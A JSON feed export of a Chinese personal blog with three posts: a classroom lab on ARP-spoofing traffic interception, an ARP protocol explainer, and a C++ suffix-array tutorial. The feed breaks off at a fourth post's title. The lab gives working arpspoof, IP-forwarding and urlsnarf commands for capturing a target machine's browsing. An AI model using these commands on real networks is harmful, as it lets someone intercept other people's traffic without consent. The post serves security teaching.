{
    "version": "https://jsonfeed.org/version/1",
    "title": null,
    "subtitle": "翩若浮云着霓裳，落幕鬓边皆染霜",
    "icon": "https://mangpumo.github.io/images/favicon.ico",
    "description": "欢迎来到 Mang Pumo 的个人博客!",
    "home_page_url": "https://MangPumo.github.io",
    "items": [
        {
            "id": "https://mangpumo.github.io/2023/01/14/ARP%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/",
            "url": "https://mangpumo.github.io/2023/01/14/ARP%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/",
            "title": "ARP攻击流量分析",
            "date_published": "2023-01-14T06:44:01.000Z",
            "content_html": "<h1 id=\"arp攻击-流量分析\"><a class=\"anchor\" href=\"#arp攻击-流量分析\">#</a> ARP 攻击 - 流量分析</h1>\n<h2 id=\"1课前准备\"><a class=\"anchor\" href=\"#1课前准备\">#</a> 1. 课前准备</h2>\n<p>1.kali 作为攻击机</p>\n<p>2.win10 作为靶机</p>\n<h2 id=\"2kali数据包转发\"><a class=\"anchor\" href=\"#2kali数据包转发\">#</a> 2.kali 数据包转发</h2>\n<p>出于安全考虑，Linux 系统默认是禁止数据包转发的。所谓转发即当主机拥有多于一块的网卡时，其中一块收到数据包，根据数据包的目的 ip 地址将数据包发往本机另一块网卡，该网卡根据路由表继续发送数据包。这通常是路由器所要实现的功能。我们需要手动开启转发功能。</p>\n<p><strong>1. 如何开启通信转发？</strong></p>\n<p>kali 里有个 ip_forward 配置文件</p>\n<p>1. 默认是 0 禁止端口转发</p>\n<p>2. 将其设置成 1 开启端口转发</p>\n<p><strong>2. 开启步骤</strong></p>\n<p>1. 查看当前是否开启了端口转发</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /proc/sys/net/ipv4/ip_forward </span><br></pre></td></tr></table></figure></p>\n<p>2. 开启通信转发的命令</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure></p>\n<p>3. 使用 arpspoof 发起 ARP 攻击</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">arpspoof -i eth0 -r 192.168.110.1 -t 192.168.110.11</span><br></pre></td></tr></table></figure></p>\n<p>4.win10 验证是否转发成功</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">访问：https://www.mashibing.com/</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"3dsniff工具\"><a class=\"anchor\" href=\"#3dsniff工具\">#</a> 3.dsniff 工具</h2>\n<p><strong>1. 工具介绍</strong></p>\n<p>Dsniff 是一个基于 unix 系统网络嗅探工具，工具集包含两个我们需要的两个工具包，arpspoof 和 urlsnarf。</p>\n<p><strong>2. 安装方法</strong></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install dsniff</span><br></pre></td></tr></table></figure></p>\n<p>3.urlsnarf 工具介绍</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">urlsnarf -h</span><br><span class=\"line\">urlsnarf [-n] [-i interface | -p pcapfile] [[-v] pattern [expression]]</span><br><span class=\"line\"></span><br><span class=\"line\">-n 表示不反查主机名</span><br><span class=\"line\">-i interface 网卡接口名</span><br><span class=\"line\">-p pattern 表示对过滤的内容使用的正则表达式</span><br><span class=\"line\">-v表示取相反，即是不匹配；expression 是过滤语法，和tcpdump的相同，请参考tcpdump。</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"4url流量分析\"><a class=\"anchor\" href=\"#4url流量分析\">#</a> 4.url 流量分析</h2>\n<p><strong>1. 概念</strong></p>\n<p>URL 流量嗅探操作非常类似于中间人攻击，通过目标主机将路由流量注入到因特网。该过程将通过 ARP 注入实现攻击。url 嗅探能够实时跟踪电脑中的数据流量信息，并且分析出它的类型和去向。从而获得你上网信息。</p>\n<p><strong>2. 攻击流程</strong></p>\n<p>1. 开启流量转发</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure></p>\n<p>2. 开启 ARP 攻击</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">arpspoof -i eth0 -r 192.168.110.1 -t 192.168.110.11</span><br></pre></td></tr></table></figure></p>\n<p>3. 捕获目标计算机的 url</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">urlsnarf -i eth0</span><br></pre></td></tr></table></figure></p>\n<p>4. 靶机上网，访问网站</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.http://www.kangda.cn/#/user/login?redirect=http%3A%2F%2Fwww.kangda.cn%2F%23%2F</span><br><span class=\"line\">2.http://blog.tianya.cn/</span><br></pre></td></tr></table></figure></p>\n<p>5.kali 分析用户请求</p>\n<h2 id=\"5课堂小结\"><a class=\"anchor\" href=\"#5课堂小结\">#</a> 5. 课堂小结</h2>\n<p>请看 ARP 流量分析课后笔记.xmind</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/14/ARP%E5%8D%8F%E8%AE%AE/",
            "url": "https://mangpumo.github.io/2023/01/14/ARP%E5%8D%8F%E8%AE%AE/",
            "title": "ARP协议",
            "date_published": "2023-01-14T06:11:19.000Z",
            "content_html": "<h1 id=\"arp协议\"><a class=\"anchor\" href=\"#arp协议\">#</a> ARP 协议</h1>\n<h2 id=\"一课前准备\"><a class=\"anchor\" href=\"#一课前准备\">#</a> 一。课前准备</h2>\n<p>1. 准备 kali 虚拟机 （原理演示机）</p>\n<p>2. 准备 centos7 虚拟机 （靶机）</p>\n<h2 id=\"二arp协议工作原理\"><a class=\"anchor\" href=\"#二arp协议工作原理\">#</a> 二.ARP 协议工作原理</h2>\n<h4 id=\"什么是arp\"><a class=\"anchor\" href=\"#什么是arp\">#</a> 什么是 ARP</h4>\n<p>地址解析协议，即 ARP（Address Resolution Protocol），是根据<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9JUCVFNSU5QyVCMCVFNSU5RCU4MA==\"> IP 地址</span>获取<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclODklQTklRTclOTAlODYlRTUlOUMlQjAlRTUlOUQlODAvMjEyOQ==\">物理地址</span>的一个<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9UQ1AlMkZJUCVFNSU4RCU4RiVFOCVBRSVBRQ==\"> TCP/IP 协议</span>。</p>\n<h4 id=\"工作原理\"><a class=\"anchor\" href=\"#工作原理\">#</a> 工作原理</h4>\n<p>ARP 协议规定，每台计算机都需要一个 ARP 表，用来保存 IP 地址和 MAC 地址的映射关系 。访问 IP 地址的时候就去查 ARP 表，从而找到对应的 MAC 地址。</p>\n<p>如果 ARP 表中匹配不到，就会使用广播的方式发送一个 ARP 请求 ，目标主机收到请求后会使用单播的方式返回一个 ARP 响应，告知自己的 MAC 地址 。</p>\n<p>拿到 MAC 地址后，会将映射关系缓存到 ARP 表，而后传递到数据链路层进行解析转换。</p>\n<h2 id=\"三arp-协议的作用\"><a class=\"anchor\" href=\"#三arp-协议的作用\">#</a> 三.ARP 协议的作用</h2>\n<p>网络中的数据传输所依赖的是 MAC 地址而不是 IP 地址，ARP 协议负责将 IP 地址转换为 MAC 地址。</p>\n<p>ARP 协议的主要工作就是建立、查询、更新、删除 ARP 表项。</p>\n<h2 id=\"四arp常用命令\"><a class=\"anchor\" href=\"#四arp常用命令\">#</a> 四.ARP 常用命令</h2>\n<ol>\n<li>查询 arp 表：</li>\n</ol>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">arp -a   </span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\".%5Cimage-20211018181543457.png\" alt=\"image-20211018181543457\"></p>\n<p>2. 删除表内某个 IP</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">arp -d IP      </span><br></pre></td></tr></table></figure></p>\n<p>3.tcp 抓某块网卡的所有 arp 请求</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i eth0 -nn arp     </span><br></pre></td></tr></table></figure></p>\n<p>4.tcp 抓取指定 ip 的请求</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i eth0 -nn arp  and host IP     </span><br></pre></td></tr></table></figure></p>\n<p>​</p>\n<h2 id=\"五arp工作过程演示\"><a class=\"anchor\" href=\"#五arp工作过程演示\">#</a> 五.ARP 工作过程演示</h2>\n<p>在 centos7 上通过抓包来了解 arp 的工作过程：</p>\n<p>1. 首先查看一下该机器有没有 ip:192.168.110.13 的 mac 地址</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">arp -a</span><br><span class=\"line\">如果存在则先删除掉</span><br><span class=\"line\">arp -d IP</span><br></pre></td></tr></table></figure></p>\n<p>2. 在 centos7 上抓包</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i eth0 -nn arp  或者 tcpdump -i eth0 -nn arp and host 192.168.110.13</span><br></pre></td></tr></table></figure></p>\n<p>3.ping 一下该 ip</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ping 192.168.110.13</span><br></pre></td></tr></table></figure></p>\n<p>4. 查看抓包结果</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">06:07:58.827256 ARP, Request who-has 192.168.110.13 tell 192.168.110.26, length 28</span><br><span class=\"line\">这句话的意思是，请问谁是192.168.110.13 ，请将你的mac地址告诉给 192.168.110.26</span><br><span class=\"line\"></span><br><span class=\"line\">06:07:58.827858 ARP, Reply 192.168.110.13 is-at 00:0c:29:90:e6:8d, length 46</span><br><span class=\"line\">这句话的意思是，我是92.168.110.13，我的mac地址是：00:0c:29:90:e6:8d</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>5. 查看最新的 ARP 表，看看是否绑定了 mac 地址</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">arp -a</span><br><span class=\"line\"></span><br><span class=\"line\">? (192.168.110.13) at 00:0c:29:90:e6:8d [ether] on eth0</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>6.ARP 的请求是一直不间断的在自动发送的，一台计算机会通信进行以下过程</p>\n<p>1. 主动询问网段下的 IP 的 MAC 地址</p>\n<p>2. 主动告诉别人我的 IP 和 MAC 地址</p>\n<p>3. 根据应答结果实时更新 ARP 表的绑定关系</p>\n<h2 id=\"六课堂总结\"><a class=\"anchor\" href=\"#六课堂总结\">#</a> 六。课堂总结</h2>\n<p>1.ARP 协议负责将 IP 地址转换为 MAC 地址。或者说 ARP 协议负责将 IP 地址和 MAC 地址进行绑定。</p>\n<p>2.ARP 协议的主要工作就是建立、查询、更新、删除 ARP 表项。</p>\n<p>3.ARP 的特性：无需人为干预，一直在进行轮询和应答</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/14/CPP%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84/",
            "url": "https://mangpumo.github.io/2023/01/14/CPP%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84/",
            "title": "CPP后缀数组",
            "date_published": "2023-01-13T20:10:20.000Z",
            "content_html": "<h1 id=\"为什么学后缀数组\"><a class=\"anchor\" href=\"#为什么学后缀数组\">#</a> 为什么学后缀数组</h1>\n<p>后缀数组是一个比较强大的处理字符串的算法，是有关字符串的基础算法，所以必须掌握。<br>\n学会后缀自动机 (SAM) 就不用学后缀数组 (SA) 了？不，虽然 SAM 看起来更为强大和全面，但是有些 SAM 解决不了的问题能被 SA 解决，只掌握 SAM 是远远不够的。</p>\n<p>有什么 SAM 做不了的例子？<br>\n比如果求一个串后缀的 lcp 方面的应用，这是 SA 可以很方便的用 rmq 来维护，但是 SAM 还要求 lca，比较麻烦，还有就是字符集比较大的时候 SA 也有优势。</p>\n<p>现在这里放道题，看完这个 blog 可能就会做了！：<br>\n你可想想这道题：你有一个 01 串 S，然后定义一个前缀最右边的位置就是这个前缀的结束位置。现在有 q 多个询问，每个询问结束位置在 l~r 中不同前缀的最长公共后缀是多长？<br>\n|S|,q≤100000|S|,q≤100000</p>\n<p>时限 4s</p>\n<p>而下面是我对后缀数组的一些理解</p>\n<h1 id=\"构造后缀数组sa\"><a class=\"anchor\" href=\"#构造后缀数组sa\">#</a> 构造后缀数组 ——SA</h1>\n<h2 id=\"先定义一些变量的含义\"><a class=\"anchor\" href=\"#先定义一些变量的含义\">#</a> 先定义一些变量的含义</h2>\n<p>Str ：需要处理的字符串 (长度为 Len)<br>\n Suffix [i] ：Str 下标为 i ~ Len 的连续子串 (即后缀)<br>\n Rank [i] : Suffix [i] 在所有后缀中的排名<br>\n SA [i] : 满足 Suffix [SA [1]] &lt; Suffix [SA [2]] …… &lt; Suffix [SA [Len]], 即排名为 i 的后缀为 Suffix [SA [i]] (与 Rank 是互逆运算)<br>\n 好，来形象的理解一下</p>\n<p><img data-src=\"https://img-blog.csdn.net/20160205125505545\" alt></p>\n<p>后缀数组指的就是这个 SA [i], 有了它，我们就可以实现一些很强大的功能 (如不相同子串个数、连续重复子串等)。如何快速的到它，便成为了这个算法的关键。而 SA 和 Rank 是互逆的，只要求出任意一个，另一个就可以 O (Len) 得到。<br>\n现在比较主流的算法有两种，倍增和 DC3，在这里，就主要讲一下稍微慢一些，但比较好实现以及理解的倍增算法 (虽说慢，但也是 O (Len logLen)) 的。</p>\n<h2 id=\"进入正题倍增算法\"><a class=\"anchor\" href=\"#进入正题倍增算法\">#</a> 进入正题 —— 倍增算法</h2>\n<p>倍增算法的主要思想 ：对于一个后缀 Suffix [i], 如果想直接得到 Rank 比较困难，但是我们可以对每个字符开始的长度为 2k2k 的字符串求出排名，k 从 0 开始每次递增 1 (每递增 1 就成为一轮)，当 2k2k 大于 Len 时，所得到的序列就是 Rank，而 SA 也就知道了。O (logLen) 枚举 k<br>\n 这样做有什么好处呢？<br>\n设每一轮得到的序列为 rank (注意 r 是小写，最终后缀排名 Rank 是大写)。有一个很美妙的性质就出现了！第 k 轮的 rank 可由第 k - 1 轮的 rank 快速得来！<br>\n 为什么呢？为了方便描述，设 SubStr (i, len) 为从第 i 个字符开始，长度为 len 的字符串我们可以把第 k 轮 SubStr (i, 2k2k) 看成是一个由 SubStr (i, 2k−12k−1) 和 SubStr (i + 2k−12k−1, 2k−12k−1) 拼起来的东西。类似 rmq 算法，这两个长度而 2k−12k−1 的字符串是上一轮遇到过的！当然上一轮的 rank 也知道！那么吧每个这一轮的字符串都转化为这种形式，并且大家都知道字符串的比较是从左往右，左边和右边的大小我们可以用上一轮的 rank 表示，那么…… 这不就是一些两位数 (也可以视为第一关键字和第二关键字) 比较大小吗！再把这些两位数重新排名就是这一轮的 rank。<br>\n我们用下面这张经典的图理解一下：</p>\n<p><img data-src=\"https://img-blog.csdn.net/20160205125603928\" alt></p>\n<p>相信只要理解字符串的比较法则 (跟实数差不多)，理解起来并不难。# 还有一个细节就是怎么把这些两位数排序？这种位数少的数进行排序毫无疑问的要用一个复杂度为长度 * 排序数的个数的优美算法 —— 基数排序 (对于两位数的数复杂度就是 O (Len) 的)。<br>\n基数排序原理 ： 把数字依次按照由低位到高位依次排序，排序时只看当前位。对于每一位排序时，因为上一位已经是有序的，所以这一位相等或符合大小条件时就不用交换位置，如果不符合大小条件就交换，实现可以用” 桶” 来做。(叙说起来比较奇怪，看完下面的代码应该更好理解，也可以上网查有关资料)<br>\n 好了 SA 和 Rank (大写 R) 到此为止就处理好了。(下面有详解代码！)。但我们发现，只有这两样东西好像没什么用，为了处理重复子串之类的问题，我们就要引入一个表示最长公共前缀的新助手 Height 数组！</p>\n<h1 id=\"构造最长公共前缀height\"><a class=\"anchor\" href=\"#构造最长公共前缀height\">#</a> 构造最长公共前缀 ——Height</h1>\n<h2 id=\"同样先是定义一些变量\"><a class=\"anchor\" href=\"#同样先是定义一些变量\">#</a> 同样先是定义一些变量</h2>\n<p>Heigth [i] : 表示 Suffix [SA [i]] 和 Suffix [SA [i - 1]] 的最长公共前缀，也就是排名相邻的两个后缀的最长公共前缀<br>\n H [i] : 等于 Height [Rank [i]]，也就是后缀 Suffix [i] 和它前一名的后缀的最长公共前缀<br>\n而两个排名不相邻的最长公共前缀定义为排名在它们之间的 Height 的最小值。<br>\n跟上面一样，先形像的理解一下：</p>\n<p><img data-src=\"https://img-blog.csdn.net/20160205125636006\" alt></p>\n<h2 id=\"高效地得到height数组\"><a class=\"anchor\" href=\"#高效地得到height数组\">#</a> 高效地得到 Height 数组</h2>\n<p>如果一个一个数按 SA 中的顺序比较的话复杂度是 O (N2N2) 级别的，想要快速的得到 Height 就需要用到一个关于 H 数组的性质。<br>\nH[i] ≥ H[i - 1] - 1!<br>\n 如果上面这个性质是对的，那我们可以按照 H [1]、H [2]……H [Len] 的顺序进行计算，那么复杂度就降为 O (N) 了！<br>\n让我们尝试一下证明这个性质：设 Suffix [k] 是排在 Suffix [i - 1] 前一名的后缀，则它们的最长公共前缀是 H [i - 1]。都去掉第一个字符，就变成 Suffix [k + 1] 和 Suffix [i]。如果 H [i - 1] = 0 或 1, 那么 H [i] ≥ 0 显然成立。否则，H [i] ≥ H [i - 1] - 1 (去掉了原来的第一个，其他前缀一样相等)，所以 Suffix [i] 和在它前一名的后缀的最长公共前缀至少是 H [i - 1] - 1。<br>\n仔细想想还是比较好理解的。H 求出来，那 Height 就相应的求出来了，这样结合 SA，Rank 和 Height 我们就可以做很多关于字符串的题了！</p>\n<h1 id=\"代码code\"><a class=\"anchor\" href=\"#代码code\">#</a> 代码 ——Code</h1>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/*</span><br><span class=\"line\">    Problem: JZOJ1598(询问一个字符串中有多少至少出现两次的子串)</span><br><span class=\"line\">    Content: SA&#x27;s Code and Explanation</span><br><span class=\"line\">    Author : YxuanwKeith</span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\">#include &lt;cstdio&gt;</span><br><span class=\"line\">#include &lt;cstring&gt;</span><br><span class=\"line\">#include &lt;algorithm&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">const int MAXN = 100005;</span><br><span class=\"line\"></span><br><span class=\"line\">char ch[MAXN], All[MAXN];</span><br><span class=\"line\">int SA[MAXN], rank[MAXN], Height[MAXN], tax[MAXN], tp[MAXN], a[MAXN], n, m; </span><br><span class=\"line\">char str[MAXN];</span><br><span class=\"line\">//rank[i] 第i个后缀的排名; SA[i] 排名为i的后缀位置; Height[i] 排名为i的后缀与排名为(i-1)的后缀的LCP</span><br><span class=\"line\">//tax[i] 计数排序辅助数组; tp[i] rank的辅助数组(计数排序中的第二关键字),与SA意义一样。</span><br><span class=\"line\">//a为原串</span><br><span class=\"line\">void RSort() &#123;</span><br><span class=\"line\">    //rank第一关键字,tp第二关键字。</span><br><span class=\"line\">    for (int i = 0; i &lt;= m; i ++) tax[i] = 0;</span><br><span class=\"line\">    for (int i = 1; i &lt;= n; i ++) tax[rank[tp[i]]] ++;</span><br><span class=\"line\">    for (int i = 1; i &lt;= m; i ++) tax[i] += tax[i-1];</span><br><span class=\"line\">    for (int i = n; i &gt;= 1; i --) SA[tax[rank[tp[i]]] --] = tp[i]; //确保满足第一关键字的同时，再满足第二关键字的要求</span><br><span class=\"line\">&#125; //计数排序,把新的二元组排序。</span><br><span class=\"line\"></span><br><span class=\"line\">int cmp(int *f, int x, int y, int w) &#123; return f[x] == f[y] &amp;&amp; f[x + w] == f[y + w]; &#125; </span><br><span class=\"line\">//通过二元组两个下标的比较，确定两个子串是否相同</span><br><span class=\"line\"></span><br><span class=\"line\">void Suffix() &#123;</span><br><span class=\"line\">    //SA</span><br><span class=\"line\">    for (int i = 1; i &lt;= n; i ++) rank[i] = a[i], tp[i] = i;</span><br><span class=\"line\">    m = 127 ,RSort(); //一开始是以单个字符为单位，所以(m = 127)</span><br><span class=\"line\"></span><br><span class=\"line\">    for (int w = 1, p = 1, i; p &lt; n; w += w, m = p) &#123; //把子串长度翻倍,更新rank</span><br><span class=\"line\"></span><br><span class=\"line\">        //w 当前一个子串的长度; m 当前离散后的排名种类数</span><br><span class=\"line\">        //当前的tp(第二关键字)可直接由上一次的SA的得到</span><br><span class=\"line\">        for (p = 0, i = n - w + 1; i &lt;= n; i ++) tp[++ p] = i; //长度越界,第二关键字为0</span><br><span class=\"line\">        for (i = 1; i &lt;= n; i ++) if (SA[i] &gt; w) tp[++ p] = SA[i] - w;</span><br><span class=\"line\"></span><br><span class=\"line\">        //更新SA值,并用tp暂时存下上一轮的rank(用于cmp比较)</span><br><span class=\"line\">        RSort(), swap(rank, tp), rank[SA[1]] = p = 1;</span><br><span class=\"line\"></span><br><span class=\"line\">        //用已经完成的SA来更新与它互逆的rank,并离散rank</span><br><span class=\"line\">        for (i = 2; i &lt;= n; i ++) rank[SA[i]] = cmp(tp, SA[i], SA[i - 1], w) ? p : ++ p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //离散：把相等的字符串的rank设为相同。</span><br><span class=\"line\">    //LCP</span><br><span class=\"line\">    int j, k = 0;</span><br><span class=\"line\">    for(int i = 1; i &lt;= n; Height[rank[i ++]] = k) </span><br><span class=\"line\">        for( k = k ? k - 1 : k, j = SA[rank[i] - 1]; a[i + k] == a[j + k]; ++ k);</span><br><span class=\"line\">    //这个知道原理后就比较好理解程序</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void Init() &#123;</span><br><span class=\"line\">    scanf(&quot;%s&quot;, str);</span><br><span class=\"line\">    n = strlen(str);</span><br><span class=\"line\">    for (int i = 0; i &lt; n; i ++) a[i + 1] = str[i];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\">    Init();</span><br><span class=\"line\">    Suffix();</span><br><span class=\"line\"></span><br><span class=\"line\">    int ans = Height[2];</span><br><span class=\"line\">    for (int i = 3; i &lt;= n; i ++) ans += max(Height[i] - Height[i - 1], 0);</span><br><span class=\"line\">    printf(&quot;%d\\n&quot;, ans);    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"4个比较基础的应用\"><a class=\"anchor\" href=\"#4个比较基础的应用\">#</a> 4 个比较基础的应用</h1>\n<p>Q1：一个串中两个串的最大公共前缀是多少？<br>\nA1：这不就是 Height 吗？用 rmq 预处理，再 O (1) 查询。</p>\n<p>Q2：一个串中可重叠的重复最长子串是多长？<br>\nA2：就是求任意两个后缀的最长公共前缀，而任意两个后缀的最长公共前缀都是 Height 数组里某一段的最小值，那最长的就是 Height 中的最大值。</p>\n<p>Q3：一个串种不可重叠的重复最长子串是多长？<br>\nA3：先二分答案，转化成判别式的问题比较好处理。假设当前需要判别长度为 k 是否符合要求，只需把排序后的后缀分成若干组，其中每组的后缀之间的 Height 值都不小于 k，再判断其中有没有不重复的后缀，具体就是看最大的 SA 值和最小的 SA 值相差超不超过 k，有一组超过的话 k 就是合法答案。</p>\n<p>A4：一个字符串不相等的子串的个数是多少？<br>\nQ4：每个子串一定是某个后缀的前缀，那么原问题等价于求所有后缀之间的不相同的前缀的个数。而且可以发现每一个后缀 Suffix [SA [i]] 的贡献是 Len - SA [i] + 1, 但是有子串算重复，重复的就是 Heigh [i] 个与前面相同的前缀，那么减去就可以了。最后，一个后缀 Suffix [SA [i]] 的贡献就是 Len - SA [k] + 1 - Height [k]。<br>\n对于后缀数组更多的应用这里就不详细阐述，经过思考后每个人都会发现它的一些不同的用途，它的功能也许比你想象中的更强大！</p>\n<h1 id=\"最开始的那道题\"><a class=\"anchor\" href=\"#最开始的那道题\">#</a> 最开始的那道题</h1>\n<p>先搬下来。。。</p>\n<p>你可想想这道题：你有一个 01 串 S，然后定义一个前缀最右边的位置就是这个前缀的结束位置。现在有很多个询问，每 q 个询问结束位置在 l~r 中不同前缀的最长公共后缀是多长？<br>\n|S|,q≤100000<br>\n 时限 4s</p>\n<p>简单思路：首先可以把字符串反过来就是求后缀的最长公共前缀了，可以用 SA 求出 height 数组，然后用 rmq 预处理之后就是求两个位置间的最小值。然后对于一个区间，显然只有在 SA 数组中相邻的两个串可以贡献答案。<br>\n对于区间询问的问题可以用莫队处理，然后考虑加入一个后缀应该怎么处理，我们可以维护一个按 SA 数组排序的链表。假设我们先把所有位置的 SA 全部加入，然后按顺序删除，重新按顺序加入时就可以 O (1) 完成修改。那么按照这个思路我们可以用固定左端点的并查集，做到只加入，不删除，然后用 O (n√n+nlogn) O (nn+nlogn) 的复杂度完成这道题。</p>\n<p><em>可能后面的处理方式比较麻烦，如果直接用 splay 维护区间中的后缀的话可以做到 O (n√n</em>logn) O (nnlogn)，这个方法就比较直观，而 SAM 在个问题上还是有点无力的。这题只是为了说明 SA 相比于 SAM 还是有他的独到之处，特别是在处理后缀的 lcp 之类的问题上。</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/14/CPP%E7%AE%97%E6%B3%95AC%E8%87%AA%E5%8A%A8%E6%9C%BA/",
            "url": "https://mangpumo.github.io/2023/01/14/CPP%E7%AE%97%E6%B3%95AC%E8%87%AA%E5%8A%A8%E6%9C%BA/",
            "title": "CPP算法AC自动机",
